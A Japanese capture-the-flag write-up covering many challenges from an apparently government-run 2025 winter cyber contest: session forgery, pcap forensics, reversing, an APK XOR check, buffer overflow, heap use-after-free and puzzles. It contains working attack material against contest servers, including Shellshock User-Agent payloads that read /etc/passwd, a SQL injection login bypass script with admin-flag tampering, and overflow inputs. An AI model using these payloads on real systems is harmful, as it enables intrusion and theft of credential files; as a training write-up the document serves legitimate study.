++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.++++++.-----------.++++++.++++++++++++++++++++.--.----------.++++++.----------------------.++++++++++++.+++.+.++++++++.------------------------.+++.++++++++++++++++.-----------------.------------------------------------------------.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.+++++++++++++++.
```

見た目がBrainFuckぽいので、[BrainFuck Compiler](https://www.tutorialspoint.com/execute_brainfk_online.php)で実行すると、フラグが得られた。




## [FR] 露出禁止！ (100pts)

> 添付のログファイルから脆弱性を特定し下記のサイトからフラグを手に入れてください。
> https://fr1-prod.2025winter-cybercontest.net/
> 【回答書式】 flag{n桁のアルファベット}

次のようなログファイルが与えられる。

```
192.168.100.103 - - [10/Jul/2024:15:36:01 +0900] "GET /index.php HTTP/1.1" 200 424
192.168.100.103 - - [10/Jul/2024:15:36:03 +0900] "POST /auth.php HTTP/1.1" 302 -
192.168.100.103 - - [10/Jul/2024:15:36:05 +0900] "GET /mypage.php?sesid=MTcyMjMxMjQxNywzLHVzZXIzCg== HTTP/1.1" 200 281
192.168.100.106 - - [10/Jul/2024:15:40:03 +0900] "GET /index.php HTTP/1.1" 200 424
192.168.100.106 - - [10/Jul/2024:15:40:08 +0900] "POST /auth.php HTTP/1.1" 302 -
192.168.100.106 - - [10/Jul/2024:15:40:11 +0900] "GET /mypage.php?sesid=MTcyMjM0Nzk5OSw2LHVzZXI2Cg== HTTP/1.1" 200 281
192.168.100.106 - - [11/Jul/2024:09:36:24 +0900] "GET /index.php HTTP/1.1" 200 424
192.168.100.106 - - [11/Jul/2024:09:36:29 +0900] "POST /auth.php HTTP/1.1" 302 -
192.168.100.106 - - [11/Jul/2024:09:36:30 +0900] "GET /ctf/fr1/index.php?msg=2 HTTP/1.1" 200 478
192.168.100.106 - - [11/Jul/2024:09:45:54 +0900] "POST /auth.php HTTP/1.1" 302 -
192.168.100.106 - - [11/Jul/2024:09:46:00 +0900] "GET /mypage.php?sesid=MTc2NzIyNTU5OSw2LHVzZXI2 HTTP/1.1" 200 281
```
試しに、`MTcyMjMxMjQxNywzLHVzZXIzCg==`を[CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=TVRjeU1qTXhNalF4Tnl3ekxIVnpaWEl6Q2c9PQ)でデコードしてみると、`1722312417,3,user3`となった。どうやら、セッションIDがクエリパラメータを通して設定できてしまう脆弱性らしい。

最初の`1722312417`はUNIX時間っぽいのでおそらく有効期限だろう。あとは、残りの２つのパラメータを適当にいじったら、次のコードでフラグを得られた。

```python
import requests
import base64
URL = "https://fr1-prod.2025winter-cybercontest.net/"

s = requests.session()
r = s.get(URL + "mypage.php", params={
    "sesid": base64.b64encode(b'1822312417,1,user1')
})
print(r.text)
```


## [FR] 成功の証 (200pts)
> フラグは攻撃者が見つけ出した「パスワード」とします。
> 【回答書式】 flag{パスワード}

pcapファイルにはいくつかのTCP通信が記録されているので、右クリック→Follow→TCP Streamで一つ一つ確認する。そうすると、Stream 188が以下のようになっていることがわかる。

```
220 (vsFTPd 3.0.3)
USER agita
331 Please specify the password.
PASS wwwww
530 Login incorrect.
USER agita
331 Please specify the password.
PASS yyyyyyyy
530 Login incorrect.
USER agita
331 Please specify the password.
PASS zyyzzyzy
230 Login successful.
```

したがって、フラグは`flag{zyyzzyzy}`である

## [FR] 犯人はこの中にいる！(200pts)
> 下記のパケットログは、攻撃のフェーズにおいて特定のサーバにポートスキャンを行ったと思われていたものです。 実は、これは内部にいる攻撃者が外部IPアドレスを偽証したものです。 本当の内部にいる攻撃者のIPアドレスを見つけてください。

pcapファイルを開くと、前半はpingが行われて、後半にポートスキャンが行われている。ポートスキャンは`59.214.32.56`から`192.168.204.116`に対して行われているように見えるが、これは偽装されたIPらしい。

以下の箇所で、リクエストを送ったマシンのMACアドレスを特定することができる。

![](/assets/blog/bouei/image-24.png)

以下のフィルタを利用して、`00:0c:29:4d:c2:33`から送られたパケットのみを表示する。

```
eth.src == 00:0c:29:4d:c2:33
```

すると、以下のpingコマンドの返答は`00:0c:29:4d:c2:33`から送られていることがわかる。

![](/assets/blog/bouei/image-25.png)

したがって、フラグは`flag{192.168.204.137}`である。

## [FR] chemistry (300pts)

> 添付のプログラムは実行時に引数として数字を与えることができます。 このプラグラムで「FLAG I AM LUCKY」と表示させるための引数を答えてください。
> 複数の引数を送る場合は、「,（カンマ）」で区切ってください。 スペースは「0」を送ってください。
> 【回答書式】 flag{数値,数値,.....}


ELFファイルが配布されるので、Ghidraでデコンパイルしてみる。

```c
undefined8 main(undefined8 param_1,long param_2)

{
  char *local_10;
  
  if (*(long *)(param_2 + 8) == 0) {
    printf("[INPUT CODE]");
  }
  else {
    local_10 = strtok(*(char **)(param_2 + 8),",");
    asciiChange(local_10);
    while (local_10 != (char *)0x0) {
      local_10 = strtok((char *)0x0,",");
      if (local_10 != (char *)0x0) {
        asciiChange(local_10);
      }
    }
  }
  putchar(10);
  return 0;
}
```

```
void asciiChange(char *param_1)

{
  int iVar1;
  char local_68 [64];
  
  local_68[0] = 'c';
  local_68[1] = 'u';
  local_68[2] = 'r';
  local_68[3] = 'l';
  local_68[4] = ' ';
  local_68[5] = 'h';
  local_68[6] = 't';
  local_68[7] = 't';
  local_68[8] = 'p';
  local_68[9] = 's';
  local_68[10] = ':';
  local_68[11] = '/';
  local_68[12] = '/';
  local_68[13] = 'f';
  local_68[14] = 'r';
  local_68[15] = '4';
  local_68[16] = '.';
  local_68[17] = '2';
  local_68[18] = '0';
  local_68[19] = '2';
  local_68[20] = '5';
  local_68[21] = 'w';
  local_68[22] = 'i';
  local_68[23] = 'n';
  local_68[24] = 't';
  local_68[25] = 'e';
  local_68[26] = 'r';
  local_68[27] = '-';
  local_68[28] = 'c';
  local_68[29] = 'y';
  local_68[30] = 'b';
  local_68[31] = 'e';
  local_68[32] = 'r';
  local_68[33] = 'c';
  local_68[34] = 'o';
  local_68[35] = 'n';
  local_68[36] = 't';
  local_68[37] = 'e';
  local_68[38] = 's';
  local_68[39] = 't';
  local_68[40] = '.';
  local_68[41] = 'n';
  local_68[42] = 'e';
  local_68[43] = 't';
  local_68[44] = '/';
  local_68[45] = 'c';
  local_68[46] = 'h';
  local_68[47] = 'e';
  local_68[48] = 'm';
  local_68[49] = 'i';
  local_68[50] = 's';
  local_68[51] = 't';
  local_68[52] = 'r';
  local_68[53] = 'y';
  local_68[54] = '?';
  local_68[55] = 'f';
  local_68[56] = 'l';
  local_68[57] = 'a';
  local_68[58] = 'g';
  local_68[59] = 'S';
  local_68[60] = 'e';
  local_68[61] = 'e';
  local_68[62] = 'd';
  local_68[63] = '=';
  strcat(local_68,param_1);
  iVar1 = atoi(param_1);
  if ((iVar1 < 0) || (0x76 < iVar1)) {
    printf("[CODE ERROR]");
  }
  else {
    iVar1 = system(local_68);
    if (iVar1 == -1) {
      printf("[Command Error[");
    }
  }
  return;
}
```

`4,5,6`という入力を行うと、`curl https://fr4.2025winter-cybercontest.net/chemistry?flagSeed=4`のように、ぞれぞれの要素で問い合わせを行い、それの結果を結合することがわかる。

いろいろと入力してみた。

```
$ curl https://fr4.2025winter-cybercontest.net/chemistry?flagSeed=1
H

$ curl https://fr4.2025winter-cybercontest.net/chemistry?flagSeed=2
HE

$ curl https://fr4.2025winter-cybercontest.net/chemistry?flagSeed=3
LI

$ curl https://fr4.2025winter-cybercontest.net/chemistry?flagSeed=4
BE
```

どうやら、数値を周期表の原子番号から元素記号に変換するようである。元素記号を組み合わせて「FLAG I AM LUCKY」になるように逆算すると、以下のような入力がうまくいった。

```
$ ./FR-4 114,47,0,53,0,95,0,71,6,19,39
FLAG I AM LUCKY
```

## [FR] InSecureApk (300pts)
> 管理者だけが使えるAndroidアプリを作成しました。 このアプリはパスワードを入れないと使うことができません。 そのパスワードがフラグとなっています。
> 【回答書式】 flag{n文字のアルファベット}

APKファイルが与えられるので、[jadx](https://qiita.com/ist-m-k/items/904e842c691e4a66e4a8)でデコンパイルする。

`AndroidManifest.xml`を確認し、最初に呼ばれるクラスを特定する。

```xml
<activity
    android:name="jp.go.cybercontest.insecureapk.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

デコンパイル結果は以下の通り。

```java:jp.go.cybercontest.insecureapk/MainActivity.java
public class MainActivity extends AppCompatActivity {
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button btClick = (Button) findViewById(R.id.button);
        AppListener listener = new AppListener();
        btClick.setOnClickListener(listener);
    }

    private class AppListener implements View.OnClickListener {
        private AppListener() {
        }

        @Override // android.view.View.OnClickListener
        public void onClick(View view) {
            EditText input = (EditText) MainActivity.this.findViewById(R.id.inputText);
            TextView output = (TextView) MainActivity.this.findViewById(R.id.flush);
            int id = view.getId();
            if (id == R.id.button) {
                String inputStr = input.getText().toString();
                if (inputStr.length() != 16) {
                    output.setText("Incorrect.");
                    return;
                }
                String compare = SecretGenerater.decode(inputStr);
                if (compare.equals("VUSTIq@H~]wGSBVH")) {
                    output.setText("Congratulations! you got flag.");
                } else {
                    output.setText("Incorrect.");
                }
            }
        }
    }
}
```

```java:jp.go.cybercontest.insecureapk/SecretGenerater.java
public class SecretGenerater {
    public static native String checkNative(String str);

    static {
        System.loadLibrary("insecureapp");
    }

    public static String decode(String str) {
        String checkLength = checkNative(str);
        if (checkLength.length() == 16) {
            return checkLength;
        }
        return "";
    }
}
```

入力に対して、`SecretGenerater.decode(inputStr)`が`VUSTIq@H~]wGSBVH`と一致すればいいらしい。`SecretGenerater.decode`が内部で利用している`SecretGenerater.checkNative`は、`System.loadLibrary("insecureapp")`を利用してバイナリをロードしている。

`Resources/lib/x84_64/libinsecureapp.so`を右クリックし、「Export」を押して、このファイルを出力する。これはELFファイルなので、Ghidraでデコンパイルする。

```c

undefined4
Java_jp_go_cybercontest_insecureapk_SecretGenerater_checkNative
          (_JNIEnv *param_1,undefined4 param_2,_jstring *param_3)

{
  byte bVar1;
  byte bVar2;
  char *pcVar3;
  byte *pbVar4;
  undefined4 uVar5;
  int in_GS_OFFSET;
  uint local_3c;
  basic_string<> local_2c [16];
  basic_string<> local_1c [16];
  int local_c;
  
  local_c = *(int *)(in_GS_OFFSET + 0x14);
  pcVar3 = (char *)_JNIEnv::GetStringUTFChars(param_1,param_3,(uchar *)0x0);
  std::__ndk1::basic_string<>::basic_string<>(local_1c,pcVar3);
                    /* try { // try from 00029bac to 00029bc0 has its CatchHandler @ 00029c3c */
  std::__ndk1::basic_string<>::basic_string<>(local_2c,"0923200802022025");
  for (local_3c = 0; local_3c < 0x10; local_3c = local_3c + 1) {
    pbVar4 = (byte *)FUN_00029dd0(local_1c,local_3c);
    bVar1 = *pbVar4;
    pbVar4 = (byte *)FUN_00029e00(local_2c,local_3c);
    bVar2 = *pbVar4;
    pbVar4 = (byte *)FUN_00029dd0(local_1c,local_3c);
    *pbVar4 = bVar1 ^ bVar2;
  }
  pcVar3 = (char *)FUN_00029e70(local_1c);
                    /* try { // try from 00029c64 to 00029c6f has its CatchHandler @ 00029cb0 */
  uVar5 = _JNIEnv::NewStringUTF(param_1,pcVar3);
  std::__ndk1::basic_string<>::~basic_string(local_2c);
  std::__ndk1::basic_string<>::~basic_string(local_1c);
  if (*(int *)(in_GS_OFFSET + 0x14) == local_c) {
    return uVar5;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

細かい実装はわからないが、`*pbVar4 = bVar1 ^ bVar2`のような形で文字をXORで暗号化している雰囲気がある。直前にある`"0923200802022025"`がちょうど16文字で`VUSTIq@H~]wGSBVH`の文字数と一致するので試しにXORしてみると、[フラグが出力された](https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'UTF8','string':'0923200802022025'%7D,'Standard',false)&input=VlVTVElxQEh%2BXXdHU0JWSA)。

## [PW] CVE-2014-7169他 (100pts)

> アクセスログから脆弱性を特定しフラグファイル内のフラグを見つけ出してください。 フラグファイルは下記の通りです。
> /etc/PW-1
> https://pw1-prod.2025winter-cybercontest.net/
>【回答書式】 flag{n桁の半角英数記号}

ログファイルは次の通り

```
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/a.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/b.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/c.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/d.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/e.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/f.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/g.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/h.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/i.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/j.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/k.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/l.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/m.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/n.cgi HTTP/1.1" 200 2007 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/o.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/p.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/q.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/r.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/s.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/t.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/u.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/v.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/x.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/y.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/z.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
192.168.123.103 - - [27/Jan/2024:20:02:22 +0900] "GET /cgi-bin/v.cgi HTTP/1.1" 404 453 "-" "() { :;}; echo Content-type:text/plain;echo;/bin/cat /etc/passwd"
```

どうやら`/cgi-bin/n.cgi`で反応があるようだ。

`/cgi-bin/n.cgi`を開くと次のようなページが表示される。

![](/assets/blog/bouei/image-20.png)

[shellshock](https://www.nca.gr.jp/info/gnu-bash-shellshock.html)とは、bashの環境変数の処理時に任意コード実行が行われてしまう脆弱性で、問題文のCVE-2014-7169もこの脆弱性を指している。ただ、とりあえずやるべきはログファイルの再現(最後の列はUser Agentであることに注意)なので、以下のcurl文を実行してみるとフラグが得られた。

```
$ curl -A "() { :;};echo Content-type:text/plain;echo;/bin/cat /etc/PW-1" https://pw1-prod.2025winter-cybercontest.net/cgi-bin/n.cgi
```


## [PW] 認可は認証の後 (200pts)

> 下記のURLにアクセスし、フラグを入手してください。 Webアプリケーション脆弱性診断の観点を持つと良いみたいです。
> https://pw2-prod.2025winter-cybercontest.net/
> 【回答書式】 flag{n桁の英数字}

次のようなページが表示される。

![](/assets/blog/bouei/image-21.png)

Webページ上では、アカウント名が8文字ちょうどで、パスワードが8文字以上という制約が鬱陶しいので、pythonスクリプトで実験する。まず、SQLインジェクションを試して見たところ刺さった。


```python
import requests

URL = "https://pw2-prod.2025winter-cybercontest.net/"

s = requests.session()
data = {
    "name": "'OR 1=1#",
    "password": "bizbaz",
    "pass-re": "bizbaza"
}
r = s.post(URL + "auth.php", data=data, allow_redirects=True)
print(r.status_code)
print(r.text)
```

実行結果
```html
<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<link rel="stylesheet" href="style.css">
<title>マイページ</title>
</head>
<body>
<div class="title">マイページ</div>
<div class="right"><a href="logout.php">ログアウト</a></div>
<hr />
ようこそmikawa01さん！<br />
<br />
[利用者情報]
<table>
<tbody>
<tr>
<td>氏名</td><td>Ieyasu Tokugawa</td>
</tr>
<tr>
<td>ステータス</td><td>No flag</td>
</tr>
</tbody>
</table>
<hr />
<form action="flag.php" method="post">
<input type="hidden" name="admin" value="0">
<input type="submit" value="フラグを表示">
</form>
</body>
</html>
```

埋め込まれているフォームに合うように、リクエストを送ってみると、フラグが得られた。

```python
import requests

URL = "https://pw2-prod.2025winter-cybercontest.net/"

s = requests.session()
data = {
    "name": "'OR 1=1#",
    "password": "bizbaz",
    "pass-re": "bizbaza"
}
r = s.post(URL + "auth.php", data=data)
print(r.status_code)
print(r.text)


data = {
    "admin": "1",
    "submit": "フラグを表示"
}
r = s.post(URL + "flag.php", data=data)
print(r.status_code)
print(r.text)
```


## [PW] overmeow (200pts)

> ファイルを用意したので、解析してもらえませんか。
> nc pw4-prod.2025winter-cybercontest.net 30001
> 【回答書式】 flag{n桁の半角英数記号}

ELFファイルが与えられる。実行すると以下のように出力される(foobarは自分の入力)。

```
$ ./overmeow
　∧,,∧
（=・ω・）meow
（,, ｕｕ)

What's the cat's say?
foobar
[hint]: overflow == 0x0
secret != 0x6d646f77 :(
```

`overflow`というヒントが与えられているので、とりあえず長い入力を与えて何が起きるか見る。

```
$ ./overmeow
　∧,,∧
（=・ω・）meow
（,, ｕｕ)

What's the cat's say?
abcdefghijklmnopqrstuvwxyz0123456789
[hint]: overflow == 0x3534333231307a79
secret != 0x6d646f77 :(
```

`0x3534333231307a79`は`yz012345`なので、この箇所が`0x6d646f77`、つまり[`wodm`](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&input=MHg2ZDY0NmY3Nw)に一致するような入力を与えてみる。すると、フラグが得られた。

```
$ nc pw4-prod.2025winter-cybercontest.net 30001
　∧,,∧
（=・ω・）meow
（,, ｕｕ)

What's the cat's say?
abcdefghijklmnopqrstuvwxwodm
Yes, I'll give you a flag.
flag{I_will_Golondon}
```

## [PW] heapmeow (300pts)

> 猫ちゃんの鳴き声はなんですか?
> nc pw5-prod.2025winter-cybercontest.net 30001
> 【回答書式】 flag{n桁の半角英数記号}

以下のようなソースコードが与えられる。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const char* WELCOME =
    "　∧,,∧\n"
    "（=・ω・）\n"
    "（,, ｕｕ)\n"
    "Dog goes woof.\n"
    "Then, Cat?";

typedef struct {
    char name[12];
    char pattern[12];
    char says[5];
} Cat;

int num_allocs;
Cat* cat;

void check_win() {
    if (!strcmp(cat->says, "meow")) {
        puts("Congratulations!");
        printf("flag{xxxxxxxxxxxxx}");
        fflush(stdout);

        exit(0);

    } else {
        puts("Try Again.");
        fflush(stdout);
    }
}

void print_menu() {
    printf(
        "\n1. Print Heap\n2. Allocate Cat\n3. Print cat->says\n4. Free cat\n5. "
        "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    puts(WELCOME);
    fflush(stdout);

    cat = malloc(sizeof(Cat));
    strncpy(cat->says, "nyao", 5);
}

void alloc_Cat() {
    char* alloc = malloc(sizeof(Cat));
    puts("What does the cat say?");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_cat() { free(cat); }

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", cat->says, cat->says);
    printf("+-------------+-----------+\n");
    fflush(stdout);
}

int main(void) {
    init();

    int choice;

    while (1) {
        print_menu();
        if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
            case 1:
                print_heap();
                break;
            case 2:
                alloc_Cat();
                check_win();
                break;
            case 3:
                printf("\n\ncat = %s\n\n", cat->says);
                fflush(stdout);
                break;
            case 4:
                free_cat();
                break;
            case 5:
                // exit
                return 0;
            default:
                puts("Invalid choice");
                fflush(stdout);
        }
    }
}
```

Use after freeの脆弱性がある。これは、4のコマンドで、グローバル変数として定義されている`cat`をfreeできるが、`check_win`で利用される`cat->says`がfreeされた後にも参照することができるからである。

また、`alloc_Cat`で割り当てられる`cat->says`の値にバッファオーバーフローの脆弱性があうｒ.`alloc_Cat`で割り当てられる新しい`Cat`の`says`がfreeされた`cat->says`よりも前に存在するならば、バッファオーバーフローにより`cat->says`を任意の値に変更できそうである。

```
$ ./a.out
　∧,,∧
（=・ω・）
（,, ｕｕ)
Dog goes woof.
Then, Cat?

1. Print Heap
2. Allocate Cat
3. Print cat->says
4. Free cat
5. Exit

Enter your choice: 4

1. Print Heap
2. Allocate Cat
3. Print cat->says
4. Free cat
5. Exit

Enter your choice: 2
What does the cat say?
abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789
Try Again.

1. Print Heap
2. Allocate Cat
3. Print cat->says
4. Free cat
5. Exit

Enter your choice: 3


cat = yz0123456789abcdefghijkl3
opqrstuvwxyz0123456789
```

よって、`yz0123456...`の部分を`meow`にすれば、フラグが得られる。

```
$ ./a.out                                                                                                                                                                          23:46:08 
　∧,,∧
（=・ω・）
（,, ｕｕ)
Dog goes woof.
Then, Cat?

1. Print Heap
2. Allocate Cat
3. Print cat->says
4. Free cat
5. Exit

Enter your choice: 4

1. Print Heap
2. Allocate Cat
3. Print cat->says
4. Free cat
5. Exit

Enter your choice: 2
What does the cat say?
abcdefghijklmnopqrstuvwxmeow
Congratulations!
flag{xxxxxxxxxxxxx}    
```

## [TR] 合体はロマン (100pts)
> 二次元バーコードでフラグを書いておきました。
> 【回答書式】 flag{n桁の半角英数字}

4つのQRコードの一部の画像が与えられる。`TR-1_3.gif`は以下のような画像である。


![](/assets/blog/bouei/TR-1_3.gif)

[ファインダパターン](https://www.keyence.co.jp/ss/products/autoid/codereader/basic2d_qr.jsp#sect_03)が無い区画ため、[アライメントパターン](https://www.keyence.co.jp/ss/products/autoid/codereader/basic2d_qr.jsp#sect_04)があるはずである。そのことから、白黒が反転していることがわかる。

残りは、重複している箇所があることに注意して、細かく位置を修正し、pyzbarを利用してデータを解釈した。

```python
from PIL import Image


filenames = [
    "TR-1_4.gif",
    "TR-1_2.gif",
    "TR-1_1.gif",
    "TR-1_3.gif",
]

images = [Image.open(fname) for fname in filenames]

images[0] = images[0].rotate(180, expand=True)
images[1] = images[1].rotate(90, expand=True)
images[2] = images[2].rotate(-90, expand=True)

after = Image.new("RGB", images[3].size)
px = images[3].load()
after_px = after.load()

for x in range(images[3].width):
    for y in range(images[3].height):
        if px[x, y] == 251:
            after_px[x, y] = (0, 0, 0) 
        else:
            after_px[x, y] = (255, 255, 255)
images[3] = after

width, height = 80,80

canvas = Image.new("RGB", (29*5, 29*5))

canvas.paste(images[0], (0, 0)) 
canvas.paste(images[1], (68, 0)) 
canvas.paste(images[2], (0, 68)) 
canvas.paste(images[3], (68, 67))


bw_img = Image.new("RGB", canvas.size)
pixels = canvas.load()
bw_pixels = bw_img.load()

for x in range(canvas.width):
    for y in range(canvas.height):
        if pixels[x, y] == (255, 255, 255):
            bw_pixels[x, y] = (255, 255, 255) 
        else:
            bw_pixels[x, y] = (0, 0, 0)

bw_img.save("combined_image.png")

from pyzbar.pyzbar import decode
print(decode(bw_img))
```

画像は以下のようになる。

![](/assets/blog/bouei/combined_image.png)


## [TR] Windowsで解きましょう (200pts)
> 下記のファイルを実行すると「flags」というフォルダが作成され、複数のファイルが生成されます。 すべてのファイルに違うフラグが書かれています。 その中のファイルの一つには印がつけてあります。正解のフラグを探してください
> 【回答書式】 flag{22桁の半角数字}

以下のようなbatファイルが与えられる。

```batch
@echo off
setlocal
set FDATA1=23
set FDATA2=61
set FDATA3=34
set FDATA4=25
set FDATA5=75
set FDATA6=64
set FDATA7=93
set FDATA8=44
set FDATA9=72
md flags
chdir flags
for /l %%n in (10,1,99) do (
  type null > flags_%%n.txt
  echo flag{%FDATA5%%FDATA4%%%n%FDATA1%%FDATA6%%FDATA2%%%n%FDATA3%%FDATA7%%FDATA9%%FDATA8%} > flags_%%n.txt
  if %%n==%FDATA4% echo > flags_%%n.txt:TrueFlag
)

endlocal
```

`%%n`が25であることに注意して、値を順番に置換すれば、Windowsでなくてもフラグ`flag{7525252364612534937244}`を手計算で逆算できる。

## [TR] 排他的倫理和 (300pts)
> 比較対象ファイルの値と各候補ファイルに記載の値のXORを計算し、有意な値を見つけてください。
> 【回答書式】 flag{IPアドレス}

ファイルを色々とXORして試してみると、次のようなコードでフラグっぽい何かが出力された

```python
p3 = open("pattern3", "rb").read()
c = open("compare", "rb").read()

b = []
for i in range(len(p1)):
    b.append(p3[i] ^ c[i])

print(bytes(b))
```

実行結果

```
b'flag{\xac\x1d\xef\xfd}'
```

問われているのが、「IPアドレス」であることに注意して、[いい感じに変形する](https://gchq.github.io/CyberChef/#recipe=Unescape_string()To_Charcode('Space',10)Find_/_Replace(%7B'option':'Simple%20string','string':'%20'%7D,'.',true,false,true,false)&input=XHhhY1x4MWRceGVmXHhmZA)ことにより、フラグ`flag{172.29.239.253}`を得られた。